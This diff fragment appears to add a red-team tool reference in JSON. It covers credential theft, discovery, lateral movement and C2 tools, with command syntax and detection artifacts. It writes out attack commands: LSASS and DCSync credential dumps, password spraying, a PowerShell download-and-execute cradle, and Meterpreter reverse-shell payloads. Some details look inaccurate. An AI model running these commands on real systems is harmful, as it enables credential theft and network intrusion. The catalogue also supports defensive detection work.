+        "description": "The most widely used credential theft tool, extracting plaintext passwords, NTLM hashes, Kerberos tickets, and DPAPI master keys from LSASS memory. Supports pass-the-hash, pass-the-ticket, Overpass-the-hash, and golden/silver ticket attacks. Requires SeDebugPrivilege for LSASS access.",
+        "common_syntax": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"; mimikatz.exe \"privilege::debug\" \"sekurlsa::wdigest\" \"exit\"; mimikatz.exe \"kerberos::ptt C:\\\\Windows\\\\Temp\\\\ticket.kirbi\" \"exit\"; mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:Administrator\"",
+        "output_parsing": "Successful privilege::debug shows 'Privilege 20 OK'. LogonPasswords shows entries with 'Username', 'Domain', 'Password' (plaintext if available), 'NTLM' hash. Kerberos tickets show 'Service' and 'Start/End Time'. DCSync outputs 'Hash NTLM' and multiple Kerberos key types per user.",
+        "artifacts": "LSASS process access (Event ID 4663, 4656), SeDebugPrivilege assertion (Event ID 4674), credential access audit logs, Mimikatz binary hash detection, DPAPI backup key extraction (lsadump::backupkeys), DCSync replication events (Event ID 4662 with Replicating Directory Changes)"
+      },
+      {
+        "name": "Rubeus",
+        "category": "Kerberos Attack Tool",
+        "description": "C# tool for Kerberos interaction and abuse. Performs Kerberoasting, AS-REP roasting, ticket extraction, pass-the-ticket, S4U2Self/S4U2Proxy abuse, and diamond ticket creation. Operates entirely in .NET memory, avoiding disk writes and many EDR signatures that flag Mimikatz.",
+        "common_syntax": "Rubeus.exe kerberoast /outfile:C:\\\\Windows\\\\Temp\\\\hashes.txt; Rubeus.exe asreproast /format:hashcat /outfile:C:\\\\Windows\\\\Temp\\\\asrep.txt; Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_HASH> /ptt; Rubeus.exe s4u /user:SVC_ACCOUNT /rc4:<HASH> /impersonateuser:administrator /ptt",
+        "output_parsing": "Kerberoast output lists SPN accounts with encrypted ticket hashes in Hashcat/JTR format. AS-REP roast shows vulnerable accounts with '$krb5asrep$' prefix hashes. Ticket requests show 'Ticket successfully imported!' for /ptt operations. S4U abuse shows 'Service Ticket and TGT extracted and imported successfully'.",
+        "artifacts": "Kerberos TGS request events (Event ID 4769) with RC4 encryption type (0x17), AS-REQ without pre-auth (Event ID 4768), Kerberos ticket cache modifications, .NET assembly load events in PowerShell, temporary .kirbi or .ccache files if written to disk"
+      },
+      {
+        "name": "secretsdump.py",
+        "category": "Remote Credential Extraction",
+        "description": "Impacket script that extracts credentials from Windows systems remotely via SMB. Pulls NTDS.dit hashes from domain controllers, SAM/SYSTEM hashes from member machines, and cached domain credentials. Supports multiple authentication methods including pass-the-hash and Kerberos.",
+        "common_syntax": "secretsdump.py corp.local/administrator:Password123@10.0.0.1; secretsdump.py -hashes :aadc3b5734e7012f admin@10.0.0.1; secretsdump.py -just-dc-ntlm corp.local/administrator:Password123@DC01.corp.local; secretsdump.py -just-dc corp.local/administrator:Password123@DC01.corp.local",
+        "output_parsing": "Output organized by section: 'Local SAM hashes', 'Domain hashes', 'Cached domain hashes'. Each hash entry shows 'username:RID:NTLM hash:::'. NTDS.dit extraction shows all domain accounts. Use '-just-dc-ntlm' for NTLM only, '-just-dc' for Kerberos keys too.",
+        "artifacts": "SMB connection events, Volume Shadow Copy creation (VSS) for NTDS.dit extraction, remote registry access (HKLM\\\\SAM and HKLM\\\\SECURITY), LSASS dump if DRSUOP failed, Event ID 4624 with logon type 3, SAM database access (Event ID 4662)"
+      },
+      {
+        "name": "LaZagne",
+        "category": "Credential Recovery Tool",
+        "description": "Open-source credential recovery tool that extracts passwords stored by 100+ applications including browsers, VPN clients, email clients, databases, and system credentials. Supports both Windows and Linux. Uses legitimate application APIs and direct memory/registry parsing to find stored credentials.",
+        "common_syntax": "laZagne.exe all; laZagne.exe browsers; laZagne.py -b all -oN -output C:\\\\Windows\\\\Temp\\\\creds; laZagne.exe databases - firefox",
+        "output_parsing": "Each module section shows application name and found credentials in 'Login/Password' pairs. Browsers show URLs with stored passwords. '-oN' flag saves to file. '-oJ' outputs JSON. Verbose mode (-v) shows extraction method per credential. Errors show '[!] Error' prefix.",
+        "artifacts": "Browser credential database access (login data, key4.db, logins.json), wifi credential extraction via netsh, registry access for saved credentials, password manager database decryption attempts, multiple application API calls in short succession"
+      },
+      {
+        "name": "SharpChromium",
+        "category": "Browser Credential Extraction",
+        "description": "C# tool that extracts Chrome, Edge, and Brave browser credentials including cookies, login data, and saved payment info. Decrypts credentials using the Chrome DPAPI key chain, bypassing Chrome's new App-Bound encryption on affected versions. Outputs directly to console or JSON format.",
+        "common_syntax": "SharpChromium.exe all; SharpChromium.exe logins; SharpChromium.exe cookies -domain \"corp.com\"; SharpChromium.exe all -browser edge",
+        "output_parsing": "Logins section shows 'URL', 'Username', 'Password' columns. Cookies section shows 'Host', 'Name', 'Value', 'Path', 'Expires' columns. If DPAPI decryption fails, shows 'Failed to decrypt' with raw encrypted blob. Domain filter returns only matching cookies for targeted session hijacking.",
+        "artifacts": "Chrome/Edge SQLite database access (Login Data, Cookies, Web Data), DPAPI master key access, Chrome Local State file read (for App-Bound encryption key), Chrome key rotation events, browser process credential access"
+      },
+      {
+        "name": "Kerbrute",
+        "category": "Kerberos Brute Force Tool",
+        "description": "Go-based tool for Kerberos pre-authentication brute forcing and username enumeration. Performs AS-REP roasting to identify accounts without pre-auth, password spraying, and username enumeration without generating Event ID 4625 (failed logon). Extremely fast due to Go concurrency.",
+        "common_syntax": "kerbrute userenum -d corp.local --dc 10.0.0.1 usernames.txt; kerbrute passwordspray -d corp.local --dc 10.0.0.1 usernames.txt 'Summer2025!'; kerbrute bruteuser -d corp.local --dc 10.0.0.1 password_list.txt administrator",
+        "output_parsing": "Valid usernames: '[+] VALID USERNAME: username@corp.local'. Successful spray: '[+] VALID LOGIN: username@corp.local:Password123'. AS-REP roastable: '[+] NO PRE-AUTH: username@corp.local'. Errors: '[-] KDC_ERR_PREAUTH_FAILED' for invalid credentials.",
+        "artifacts": "High volume of Kerberos AS-REQ events (Event ID 4768), multiple TGS requests for different users from same source IP (Event ID 4769), Kerberos error codes in failed requests, unusual source IP for AS-REQ traffic patterns"
+      },
+      {
+        "name": "Snaffler",
+        "category": "Network Credential Discovery",
+        "description": "C# tool that enumerates Active Directory and file shares to find credentials, secrets, and sensitive files. Uses LDAP to find computers and shares, then recursively searches file contents for patterns like passwords, connection strings, SSH keys, certificates, and API tokens. Classifies findings by severity.",
+        "common_syntax": "Snaffler.exe -s -d corp.local -o C:\\\\Windows\\\\Temp\\\\snaffler.log; Snaffler.exe -s -d corp.local -c \"10.0.0.0/24\" -o results.txt; Snaffler.exe -s -d corp.local -v info",
+        "output_parsing": "Color-coded severity: RED = credentials found, YELLOW = interesting files, GREEN = share enumeration. Each finding shows UNC path and matched pattern. '-o' flag writes structured log. Use '-v info' for maximum verbosity. Share enumeration shows accessible paths and permissions.",
+        "artifacts": "Massive SMB connection volume across domain, LDAP queries for computer objects (Event ID 4662), share enumeration against multiple hosts, file read access across network shares, pattern matching search patterns in file contents"
+      },
+      {
+        "name": "Get-GPPPassword",
+        "category": "Group Policy Credential Extraction",
+        "description": "PowerSploit module that extracts Group Policy Preferences (GPP) passwords stored in SYSVOL XML files. These cpassword values are decryptable using the publicly known Microsoft AES key. Finds cached GPP passwords even after GPO removal if XML files remain in SYSVOL.",
+        "common_syntax": "Get-GPPPassword; Get-GPPPassword -Server DC01.corp.local; Get-GPPPassword | Export-Csv -Path C:\\\\Windows\\\\Temp\\\\gpp.csv",
+        "output_parsing": "Each GPP password entry shows: 'File path' (XML location in SYSVOL), 'UserName', 'NewName' (if renamed), 'cPassword' (encrypted), 'Password' (decrypted), 'Changed' (timestamp). Empty 'Password' field means the cPassword was cleared or the GPP was removed.",
+        "artifacts": "SMB access to \\\\DOMAIN\\\\SYSVOL\\\\domain.local\\\\Policies\\\\, XML file reads in GPO directories, Group Policy Preference file access, decrypted password patterns matching known Microsoft AES key usage"
+      },
+      {
+        "name": "lsassy",
+        "category": "LSASS Credential Extraction",
+        "description": "Python tool that remotely extracts credentials from LSASS memory using multiple methods including comsvcs.dll minidump, procdump, and direct memory parsing. Supports authentication via SMB with pass-the-hash, Kerberos, or plaintext credentials. Parses dump files locally to avoid EDR detection of in-memory parsing.",
+        "common_syntax": "lsassy -d corp.local -u administrator -p Password123 10.0.0.1; lsassy -d corp.local -u admin -H aadc3b5734e7012f 10.0.0.0/24; lsassy -d corp.local -u admin -H :NTLM_HASH 10.0.0.1 --method procdump; lsassy -d corp.local -u admin -p pass 10.0.0.1 --method comsvcs",
+        "output_parsing": "Outputs table with columns: 'Domain', 'Username', 'Password' (plaintext), 'NTLM Hash', 'SHA1', 'DPAPI'. Credentials categorized by type (logged on, SSP, etc.). Use '--export' to dump all hashes. Method flags show which extraction technique succeeded. Verbose mode shows dump file creation path.",
+        "artifacts": "LSASS process dump creation (Event ID 4688 with procdump.exe/comsvcs.dll), minidump file artifacts in temp directories, SMB connection establishing before extraction, handle access to LSASS process (Event ID 4656), credential access event (Event ID 4663)"
+      }
+    ]
+  },
+  "TA0007": {
+    "tactic": "discovery",
+    "description": "Techniques adversaries use to gather information about the target environment, including systems, accounts, services, and network topology. Discovery enables attackers to map the environment for effective lateral movement and privilege escalation.",
+    "comes_after": "Initial Access or Credential Access",
+    "comes_before": "Lateral Movement or Collection",
+    "tools": [
+      {
+        "name": "BloodHound/SharpHound",
+        "category": "Active Directory Mapping",
+        "description": "BloodHound maps Active Directory trust relationships, permission paths, and attack surfaces using graph theory. SharpHound is the data collector that gathers AD data via LDAP, RPC, and SAMR. Identifies shortest paths from owned principals to Domain Admins through group membership, ACL abuse, and session-based paths.",
+        "common_syntax": "SharpHound.exe -c all -d corp.local --lsthash :NTLM_HASH; SharpHound.exe -c CollectionMethod=ACL,Group --searchforest; SharpHound.exe -c sessionloop --loop --loopduration 02:00:00; bloodhound-python -d corp.local -u administrator -p Password123 -ns 10.0.0.1 -c all",
+        "output_parsing": "SharpHound produces timestamped ZIP files (e.g., '20250108120000_BloodHound.zip'). Console shows collection progress per method: 'Computing groups...', 'Computing ACLs...', 'Computing sessions...'. Import into BloodHound GUI via 'Upload Data'. Analyze with prebuilt queries like 'Shortest Path to Domain Admins'.",
+        "artifacts": "Massive LDAP query volume (Event ID 4662 for directory access), SAMR enumeration (Event ID 4797 for group membership queries), RPC session enumeration, DNS zone transfers, network connections to all domain computers on port 445/135/389/636"
+      },
+      {
+        "name": "Seatbelt.exe",
+        "category": "Host Enumeration Tool",
+        "description": "C# host enumeration tool from GhostPack that collects 50+ security-relevant data points including AMSI configuration, AppLocker rules, credential stores, LSA settings, network connections, process lists, and registry hardening. Runs in memory via reflection or as standalone binary.",
+        "common_syntax": "Seatbelt.exe -group=all -full; Seatbelt.exe -group=system; Seatbelt.exe AMSIProviders AppLocker LSASettings; Seatbelt.exe -group=remote -computername=DC01.corp.local -username=corp\\\\admin -password=Password123",
+        "output_parsing": "Each check produces a section header and key-value output. Critical findings prefixed with '[!]'. Group filters: 'all', 'system', 'user', 'security', 'remote', 'misc'. '-full' flag includes extended data like full command lines and file contents. Output suitable for parsing with findstr/grep.",
+        "artifacts": "Registry enumeration across multiple hives (HKLM\\\\SOFTWARE, HKLM\\\\SYSTEM), WMI queries for system information, .NET assembly load events, AMSI scans for memory-loaded execution, extensive file system read operations"
+      },
+      {
+        "name": "nmap",
+        "category": "Network Scanner",
+        "description": "Industry-standard network discovery and security auditing tool. Supports host discovery, port scanning (TCP SYN, UDP, ACK, etc.), service version detection, OS fingerprinting, and NSE script scanning. The foundation tool for mapping target networks and identifying potentially exploitable services.",
+        "common_syntax": "nmap -sV -sC -O 10.0.0.0/24; nmap -p- -T4 --min-rate 1000 10.0.0.5; nmap -sU -sV --top-ports 1000 10.0.0.5; nmap --script=vuln 10.0.0.5",
+        "output_parsing": "Port table shows: 'PORT', 'STATE' (open/filtered/closed), 'SERVICE', 'VERSION'. OS detection shows 'OS details' with confidence percentages. NSE script output appears in additional tables below port scan. Use '-oX' for XML, '-oA' for all formats, '-oN' for normal.",
+        "artifacts": "SYN flood detectable by IDS/IPS, ARP requests for host discovery, mass TCP SYN/ACK packets, DNS reverse lookups for target IPs, connections from source port pattern (nmap uses predictable source ports), OS fingerprint TTL/window size patterns"
+      },
+      {
+        "name": "masscan/rustscan",
+        "category": "Rapid Port Scanner",
+        "description": "masscan is the fastest port scanner capable of scanning the entire internet in 6 minutes. Uses custom TCP/IP stack for asynchronous transmission at wire speed. rustscan is a modern alternative that combines masscan's speed with nmap's service detection. Both are used for rapid large-scale port discovery.",
+        "common_syntax": "masscan -p1-65535 10.0.0.0/24 --rate=10000 --open-only; masscan -p80,443,445,3389 10.0.0.0/16 --rate=100000 -oJ results.json; rustscan -a 10.0.0.5 -- -sV -sC; rustscan -a 10.0.0.0/24 -b 5000 -- -A",
+        "output_parsing": "masscan outputs: 'Discovered open port <port>/tcp on <ip>'. Use '-oJ' for JSON, '-oX' for XML, '-oL' for list format. '--open-only' filters closed ports. rustscan shows list of open ports then automatically passes to nmap for service detection. rustscan progress bar shows scan percentage.",
+        "artifacts": "Extremely high SYN packet rate (configurable via --rate), unique source IP/port pattern, custom TCP/IP stack (no OS fingerprint match), rapid RST packets, detectable by rate-based IDS signatures with threshold alerts"
+      },
+      {
+        "name": "ADRecon/SharpView",
+        "category": "Active Directory Enumeration",
+        "description": "ADRecon extracts comprehensive Active Directory information including domain structure, trusts, GPOs, ACLs, SPNs, and delegations via LDAP queries. SharpView is a C# port of PowerView that provides AD enumeration capabilities in .NET. Both map attack surfaces without requiring domain admin privileges.",
+        "common_syntax": "ADRecon.py -d corp.local -u administrator -p Password123 -l 10.0.0.1 --all; SharpView.exe Get-DomainUser -Properties samaccountname,memberof; SharpView.exe Get-DomainComputer -Properties dnshostname,operatingsystem; SharpView.exe Get-DomainTrust",
+        "output_parsing": "ADRecon produces Excel spreadsheets with separate tabs per category (Users, Groups, GPOs, Trusts, etc.). SharpView outputs PowerShell-style object lists. Filter with '-Properties' flag for specific attributes. '-Identity' flag targets specific objects.",
+        "artifacts": "LDAP queries (Event ID 1644 if logging enabled), high-volume directory access events (Event ID 4662), SAM session enumeration, network connections to DC on port 389/636/3268/3269"
+      },
+      {
+        "name": "PowerView.ps1",
+        "category": "Active Directory Enumeration",
+        "description": "PowerSploit's Situational Awareness module providing comprehensive Active Directory and Windows domain enumeration functions. Supports domain user/group/computer queries, trust discovery, ACL analysis, Kerberos enumeration, and session hunting. The foundational tool for AD reconnaissance during red team operations.",
+        "common_syntax": "Get-DomainUser -Identity 'admin*' -Properties samaccountname,memberof; Get-DomainComputer -OperatingSystem '*Server*' -Properties dnshostname; Get-DomainTrust -Domain corp.local; Find-LocalAdminAccess -ComputerFile targets.txt; Get-DomainSID",
+        "output_parsing": "All Get-* functions return PSObject collections. Use '-Properties' to select specific AD attributes. '-Identity' filters by name pattern. 'Find-LocalAdminAccess' returns 'ComputerName' where current user has admin access. ConvertTo-SDDL provides ACL SDDL strings.",
+        "artifacts": "LDAP queries visible in Event ID 4662 (directory service access), SAMR session queries (Event ID 4797), RPC enumeration (Event ID 5712 for DRSUAPI), DNS lookup queries for domain controllers, PowerShell script block logging (4104)"
+      },
+      {
+        "name": "PingCastle",
+        "category": "Active Directory Security Audit",
+        "description": "Active Directory security assessment tool that evaluates domain configuration against 80+ risk rules covering trust relationships, privilege escalation paths, delegation configurations, and hardening baselines. Produces an HTML report with risk scoring and remediation guidance.",
+        "common_syntax": "PingCastle.exe --healthcheck --server corp.local; PingCastle.exe --scanner share --server 10.0.0.1; PingCastle.exe --scanner foreignusers --server corp.local; PingCastle.exe --carto",
+        "output_parsing": "HTML report contains risk rules scored from 0 (informational) to 10 (critical). Each rule shows description, rationale, and remediation. Summary page shows overall risk score (0-100). 'Anomaly Packs' section shows detected misconfigurations. Carto mode maps trust relationships.",
+        "artifacts": "LDAP queries (Event ID 4662), SMB connections to domain controllers, SAMR enumeration, DNS queries for SRV records, high volume of directory access events during healthcheck, potential detection by AD monitoring tools"
+      }
+    ]
+  },
+  "TA0008": {
+    "tactic": "lateral-movement",
+    "description": "Techniques adversaries use to move through a network environment to access remote systems. Lateral movement enables attackers to reach target data or escalate privileges across multiple systems in the network.",
+    "comes_after": "Discovery or Credential Access",
+    "comes_before": "Collection or Command and Control",
+    "tools": [
+      {
+        "name": "CrackMapExec/NetExec",
+        "category": "Network Execution Framework",
+        "description": "Swiss-army knife for network pentesting supporting SMB, WinRM, SSH, MSSQL, and LDAP execution. NetExec is the community-maintained successor. Enables credential testing, command execution, payload deployment, and enumeration across subnets. Supports credential spraying, pass-the-hash, and Kerberos authentication.",
+        "common_syntax": "nxc smb 10.0.0.0/24 -u administrator -p Password123 --shares; nxc smb 10.0.0.5 -u admin -H aadc3b5734e7012f -x whoami; nxc winrm 10.0.0.5 -u administrator -p Password123 -x \"powershell -nop -c IEX(New-Object Net.WebClient).DownloadString(\\\"http://10.0.0.5/stage.ps1\\\")\"; nxc smb 10.0.0.0/24 -u administrator -H NTLM_HASH --local-auth",
+        "output_parsing": "Credential validation shows 'Pwn3d!' for local admin, 'STATUS_ACCESS_DENIED' for failure. Share enumeration lists accessible shares with READ/WRITE permissions. Command execution shows output inline. Use '--continue-on-success' for spraying without stop-on-first-success.",
+        "artifacts": "Massive SMB connection volume (port 445), authentication events (Event ID 4624 type 3), failed logons (Event ID 4625), service creation (PsExec), WinRM connections (port 5985/5986), multiple source authentication from same credentials"
+      },
+      {
+        "name": "PsExec",
+        "category": "Remote Execution Tool",
+        "description": "Sysinternals (and Metasploit) tool that executes programs on remote Windows systems via SMB. Installs a temporary Windows service (PSEXESVC) on the target, starts it, and communicates via named pipes. Requires administrative shares (ADMIN$) and Service Control Manager access. Often detected by EDR due to service creation patterns.",
+        "common_syntax": "PsExec.exe \\\\\\\\10.0.0.5 -u administrator -p Password123 -s cmd.exe; PsExec.exe \\\\\\\\10.0.0.5 -c payload.exe; psexec.py corp.local/administrator:Password123@10.0.0.5",
+        "output_parsing": "Successful connection shows remote console or command output. The '-c' flag copies the binary before execution. Impacket's psexec.py returns a semi-interactive shell. Service name appears as 'PSEXESVC' in service control manager. Error messages include 'Access is denied' and 'The network path was not found'.",
+        "artifacts": "Service creation (Event ID 4698 or 7045), ADMIN$ share access for binary upload, named pipe creation (\\\\.\\\\pipe\\\\PSEXESVC), service start/stop events (Event ID 7036), service binary path 'C:\\\\Windows\\\\PSEXESVC.exe', PsExec service creation and cleanup events"
+      },
+      {
+        "name": "WMIexec/SMBexec",
+        "category": "Remote Execution Tool (Impacket)",
+        "description": "Impacket tools that execute commands remotely without dropping binaries. WMIexec uses WMI for command execution and SMB for output retrieval. SMBexec creates a temporary service for each command. Both are stealthier than PsExec as they don't drop a persistent service binary, though they are noisier than native WMI.",
+        "common_syntax": "wmiexec.py corp.local/administrator:Password123@10.0.0.5; smbexec.py corp.local/administrator:Password123@10.0.0.5; wmiexec.py -hashes :aadc3b5734e7012f corp.local/admin@10.0.0.5 'whoami'; smbexec.py -shell-type powershell corp.local/admin:Password123@10.0.0.5",
+        "output_parsing": "wmiexec returns a semi-interactive shell where each command executes via WMI and output is retrieved via SMB. smbexec shows '[*] Creating service <BOGUS_SERVICE>' then executes commands. Use '-shell-type powershell' for PowerShell shell. Error: '[-] Logon failure' for bad credentials.",
+        "artifacts": "WMI connection events (Event ID 4624 logon type 3), DCOM/RPC activation (IWbemLevel1Login), temporary service creation/deletion cycles (Event ID 7045 for SMBexec), ADMIN$ or C$ share access for output retrieval, command output written to temp files via SMB"
+      },
+      {
+        "name": "Evil-WinRM",
+        "category": "Remote Shell Tool",
+        "description": "Ruby-based WinRM shell optimized for penetration testing with built-in features for file upload/download, DLL loading, and PS1 script execution. Supports pass-the-hash, Kerberos, and certificate authentication. Provides menu-driven interface for common post-exploitation tasks and integrates with popular tools like Mimikatz.",
+        "common_syntax": "evil-winrm -i 10.0.0.5 -u administrator -p Password123; evil-winrm -i 10.0.0.5 -u administrator -H aadc3b5734e7012f; evil-winrm -i 10.0.0.5 -u administrator -p Password123 -s C:\\\\Windows\\\\Temp\\\\scripts\\\\ -e C:\\\\Windows\\\\Temp\\\\exe\\\\; menu; upload C:\\\\payload.exe C:\\\\Windows\\\\Temp\\\\payload.exe",
+        "output_parsing": "Successful connection shows 'Info: Establishing connection to remote endpoint' then PowerShell prompt. Built-in commands: 'upload', 'download', 'menu' (shows available modules). Script execution with 'Invoke-Mimikatz' if scripts path configured. Use '-s' for PS1 scripts, '-e' for EXEs.",
+        "artifacts": "WinRM connections (port 5985/5986), Event ID 4624 logon type 3 via WinRM, PowerShell script block logging (4104), WSMAN namespace access, file transfer over WinRM SOAP protocol, WSMan provider logs"
+      },
+      {
+        "name": "xfreerdp",
+        "category": "Remote Desktop Client",
+        "description": "FreeRDP command-line client for RDP connections. Supports NLA authentication, drive redirection, clipboard sharing, and gateway connections. Adversaries use it for graphical remote access with credential reuse. Supports pass-the-hash via restricted admin mode.",
+        "common_syntax": "xfreerdp /v:10.0.0.5 /u:administrator /p:Password123 /dynamic-resolution; xfreerdp /v:10.0.0.5 /u:admin /pth:aadc3b5734e7012f /cert:ignore; xfreerdp /v:10.0.0.5 /u:admin /p:pass /drive:share,/tmp/share /clipboard",
+        "output_parsing": "Successful connection shows 'Connection successful' then opens RDP session window (or headless console). '/cert:ignore' bypasses certificate warnings. '/dynamic-resolution' enables resize. '/drive:share,/path' maps local directory. Error messages include 'Authentication failed' and 'Connection refused'.",
+        "artifacts": "RDP connection events (Event ID 4624 logon type 10 for console, type 7 for reconnect), NLA authentication attempts, RDP graphics channel traffic (port 3389), clipboard and drive redirection channel data, Terminal Services logs"
+      },
+      {
+        "name": "ssh/scp",
+        "category": "Remote Access Tools",
+        "description": "Standard SSH client and Secure Copy tools used for encrypted remote shell access and file transfer. Adversaries leverage SSH for lateral movement in Unix environments, often using stolen SSH keys, credentials from .ssh directories, or authorized_keys manipulation. SCP enables secure file transfer for payload deployment.",
+        "common_syntax": "ssh administrator@10.0.0.5 -i /tmp/stolen_key -o StrictHostKeyChecking=no; ssh -L 8888:10.0.0.10:3389 admin@10.0.0.5; scp C:\\\\Windows\\\\Temp\\\\payload.exe admin@10.0.0.5:/tmp/payload.exe; ssh -R 9999 10.0.0.5 'chmod +x /tmp/payload && /tmp/payload'",
+        "output_parsing": "SSH connection shows 'Last login:' with timestamp and source IP. SCP shows transfer progress with filename and size. Use '-v' for verbose debugging (shows key exchange, auth methods). '-p' for preserving timestamps. Failed auth: 'Permission denied (publickey,password)'. Established: shows shell prompt or executed command output.",
+        "artifacts": "SSH daemon logs (auth.log / secure.log), Event ID 4624 logon type 10 (RDP) or S4U, authorized_keys file modifications, .ssh/known_hosts entries, SSH tunnel connections (local/remote port forwarding), data transfer via SCP recorded in sshd sessions"
+      },
+      {
+        "name": "chisel/socat",
+        "category": "Tunneling/Pivoting Tools",
+        "description": "Chisel is a Go-based HTTP tunneling tool that creates TCP/UDP tunnels through HTTP connections, supporting reverse pivoting. socat is a versatile relay tool that establishes bidirectional data transfer between two addresses. Both enable pivoting through compromised hosts to reach isolated network segments.",
+        "common_syntax": "chisel server -p 8080 --reverse; chisel client 10.0.0.5:8080 R:socks; chisel client 10.0.0.5:8080 R:8888:10.0.0.10:3389; socat TCP-LISTEN:8888,fork TCP:10.0.0.10:3389; socat TCP-LISTEN:8080,fork PROXY:proxy.corp.local:10.0.0.10:443,proxyport=8080",
+        "output_parsing": "Chisel client shows 'session#1 tunnellink: Connected' when tunnel established. Server shows each client connection with unique ID. Port forwarding rules displayed as 'R:<bind_port>-><target_host>:<target_port>'. socat runs silently by default; use '-d -d' for verbose connection logging.",
+        "artifacts": "HTTP CONNECT tunnel connections, long-lived TCP sessions on unusual ports, SOCKS proxy traffic patterns, bidirectional relay connections, DNS lookups for relay targets, chisel binary signature in process memory, unusual port binding (netstat anomalies)"
+      }
+    ]
+  },
+  "TA0011": {
+    "tactic": "command-and-control",
+    "description": "Techniques adversaries use to communicate with systems under their control within a compromised network. C2 channels enable adversaries to issue commands, exfiltrate data, and maintain persistent remote access throughout the attack lifecycle.",
+    "comes_after": "Persistence or Defense Evasion",
+    "comes_before": "Execution or Exfiltration",
+    "tools": [
+      {
+        "name": "Cobalt Strike",
+        "category": "Commercial C2 Framework",
+        "description": "Premium adversarial simulation framework with team server architecture, Malleable C2 profiles for traffic shaping, and Beacon implant supporting multiple C2 channels (HTTP, HTTPS, DNS, SMB, TCP). Provides session piggybacking, post-exploitation job management, and extensive BOF (Beacon Object File) support for in-process execution.",
+        "common_syntax": "beacon> shell whoami /all; beacon> execute-assembly Seatbelt.exe -group=all; beacon> upload C:\\\\payload.exe; beacon> connect <target>:4444; beacon> socks 1080; beacon> make_token CORP\\\\admin Password123",
+        "output_parsing": "Beacon output prefixed with '[+]'. Task output appears in specified console. 'tasks' command shows queued commands. Use 'checkin' to force callback. Jitter and sleep settings affect callback frequency. SMB beacons use named pipes visible via '\\\\\\\\.\\\\pipe\\\\msagent_*'.",
+        "artifacts": "Malleable C2 profile matching (HTTP header patterns, URI stems), JA3/JA3S TLS fingerprinting mismatches, Beacon DLL injection artifacts, named pipe 'msagent_*' or 'status_*', task beacon DLL side-loading, Cobalt Strike team server JAR files, X509 certificates with unusual metadata"
+      },
+      {
+        "name": "Sliver",
+        "category": "Open-Source C2 Framework",
+        "description": "Cross-platform C2 framework written in Go with modular implant architecture. Supports mTLS, WireGuard, DNS, HTTP(S), and TCP/UDP pivoting. Provides Armory package manager for community modules. Implants support canaries for detection tracking and are generated per-operator with unique keys.",
+        "common_syntax": "generate --http 10.0.0.5:443 --os windows --save /opt/sliver; use <session_id>; shell whoami; execute-assembly /opt/tools/Seatbelt.exe; pivots add --id <session_id> --bind-address 127.0.0.1:8888; dns --domains c2.corp.com",
+        "output_parsing": "Implants listed with 'sliver >' prompt showing session ID, remote address, and hostname. Command output appears inline. Use 'sessions' to list active implants, 'background' to detach. Armory modules installed via 'armory install <name>'. DNS beacons show as 'CLOSED' until first callback.",
+        "artifacts": "Go binary implants with embedded WireGuard/TLS certificates, mTLS handshake with custom CA certificate, DNS TXT query patterns for DNS C2, HTTP(S) beaconing patterns with configurable jitter, WireGuard UDP traffic on non-standard ports, implant canary DNS callbacks"
+      },
+      {
+        "name": "Mythic",
+        "category": "C2 Framework Platform",
+        "description": "Docker-based C2 platform that supports multiple agent types (Apollo, Medusa, Poseidon, etc.) through a unified web interface. Provides agent management, task tracking, and payload generation via web API. Modular architecture allows adding new agent types and C2 profiles independently.",
+        "common_syntax": "mythic-cli install github.com/MythicAgents/Apollo; mythic-cli install github.com/MythicC2Profiles/http; create_payload --payload-type apollo --c2-profile http; task <callback_id> shell whoami; task <callback_id> upload /tmp/payload.exe C:\\\\Windows\\\\Temp\\\\payload.exe",
+        "output_parsing": "Web UI shows agent callbacks with status (active/checkin/stale). Task results appear in agent messages view. Payload generation provides download link. Checkin interval configurable per C2 profile. 'Interactive' tab shows live shell output. Use 'search' to filter tasks and callbacks.",
+        "artifacts": "Docker container network traffic, HTTPS callbacks to Mythic server (configurable C2 profile), agent-specific binary signatures (Apollo: .NET, Poseidon: Go), WebSocket connections for UI, custom C2 profile traffic matching"
+      },
+      {
+        "name": "Metasploit",
+        "category": "Exploitation Framework",
+        "description": "The original and most widely used penetration testing framework. Supports exploit development, payload generation, and post-exploitation via Meterpreter. Provides over 2,000 exploits, 1,000 payload types, and extensive module library. MSFVenom generates standalone payloads for any C2 framework. Meterpreter provides in-memory execution with reflective loading.",
+        "common_syntax": "use exploit/windows/smb/psexec; set RHOSTS 10.0.0.5; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.5; exploit; meterpreter> hashdump; meterpreter> getsystem; msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.5 LPORT=443 -f psh-reflection",
+        "output_parsing": "Successful exploit shows '[+] Started reverse TCP handler' and '[+] Meterpreter session 1 opened'. Meterpreter prompt shows 'meterpreter >'. Sessions listed with 'sessions -l'. Background sessions with Ctrl+Z. Module info via 'info <module>'. Error: '[-] Exploit failed' with specific reason.",
+        "artifacts": "MSF handler connections on specified LPORT, staged payload download (small stub fetches larger payload), Meterpreter reflective DLL injection in target memory, known MSF template hashes in payload binaries, default handler port patterns (4444), Metasploit HTTP transaction patterns identifiable by IDS"
+      },
+      {
+        "name": "dnscat2",
+        "category": "DNS Tunneling C2",
+        "description": "DNS tunneling tool that establishes C2 channels entirely over DNS queries and responses. Encodes data in subdomain labels of DNS queries (CNAME, TXT, MX records). Extremely stealthy as DNS traffic is rarely filtered. Supports encryption (AES-256-CBC), command execution, and file transfer over the DNS channel.",
+        "common_syntax": "ruby dnscat2.rb corp.com --secret=MySecretKey; dnscat2.exe --secret MySecretKey --domain corp.com --dns 10.0.0.5; dnscat2.exe --secret MySecretKey --domain corp.com --dns 8.8.8.8 --security dnscrypt",
+        "output_parsing": "Server shows 'Session opened' with session ID. Client shows 'Established link to <server>'. Commands executed via 'exec' command return output inline. 'download' and 'upload' show progress. 'shutdown' terminates session gracefully. DNS latency affects throughput significantly (~3-5 KB/s typical).",
+        "artifacts": "Excessive DNS query volume targeting attacker-controlled domain, DNS CNAME records with base64/hex encoded subdomain labels, TXT query responses containing long encoded strings, DNS query characteristics (high entropy subdomain labels >30 chars), network connections exclusively on port 53"
+      },
+      {
+        "name": "Malleable C2",
+        "category": "C2 Traffic Shaping",
